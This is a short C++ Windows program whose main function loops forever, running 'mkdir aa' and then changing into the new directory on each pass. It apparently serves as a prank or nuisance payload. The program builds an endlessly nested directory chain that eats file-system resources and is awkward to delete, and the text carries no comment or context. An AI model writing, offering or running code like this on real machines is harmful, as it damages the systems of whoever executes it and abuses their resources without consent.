#include <cstdlib>

#include <windows.h>

int main()
{
	while (true)
	{
		system("mkdir aa");
		SetCurrentDirectory("aa");
	}
}